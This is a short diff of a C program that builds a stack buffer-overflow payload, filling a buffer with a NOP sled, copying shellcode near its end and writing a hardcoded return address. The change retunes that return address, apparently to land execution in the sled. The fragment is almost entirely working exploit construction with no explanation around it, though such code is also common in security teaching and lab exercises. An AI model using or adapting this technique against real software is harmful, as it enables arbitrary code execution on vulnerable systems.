@@ -15,7 +15,7 @@ int main(void)
   char attack[size];
   memset(attack, 0x90, size);
 
-  char ret[] = "\xb8\xfc\xff\xbf";
+  char ret[] = "\xd0\xfc\xff\xbf";
   memcpy(attack + (size - 49), shellcode, 45);
   memcpy(attack + (size - 4), ret, 4);
  
